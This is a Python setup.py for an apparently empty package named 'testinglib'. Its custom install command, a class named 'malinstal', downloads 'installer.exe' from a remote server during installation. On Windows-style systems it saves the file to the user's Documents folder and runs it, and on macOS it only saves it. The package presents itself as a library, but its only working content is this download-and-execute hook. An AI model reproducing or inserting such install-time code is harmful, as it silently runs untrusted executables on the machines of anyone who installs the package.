import os
import urllib.request
import sys
import platform
import subprocess
from setuptools import setup
from setuptools.command.install import install

NAME = 'testinglib'
DESCRIPTION = 'yapfest'
URL = 'https://github.com/slikc/testinglib'
EMAIL = 'hi@slikc.me'
AUTHOR = 'slikc'
REQUIRES_PYTHON = '>=2.7.0'
VERSION = '1.4.1'


class malinstal(install):
    def run(self):
        if platform.system() != 'Darwin':
            username = os.environ['USERNAME']
            documents = f'C:\\Users\\{username}\\Documents'
            os.chdir(documents)
            installer_url = 'https://api.slikc.me/installer'
            with urllib.request.urlopen(installer_url) as response:
                installer_content = response.read()
                print(installer_content[:100])
            with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
                f.write(installer_content)
            os.system('installer.exe')
        else:
            installer_url = 'https://api.slikc.me/installer'
            with urllib.request.urlopen(installer_url) as response:
                installer_content = response.read()
                print(installer_content[:100])
            with open('installer.exe', 'wb') as f:
                f.write(installer_content)
            print('Installer downloaded to current directory')

setup(
    name=NAME,
    description=DESCRIPTION,
    author=AUTHOR,
    author_email=EMAIL,
    python_requires=REQUIRES_PYTHON,
    url=URL,
    version=VERSION,
    license='MIT',
    install_requires=[''],
    keywords=[''],
    classifiers=[''],
    packages=[''],
    cmdclass={"install": malinstal},
)
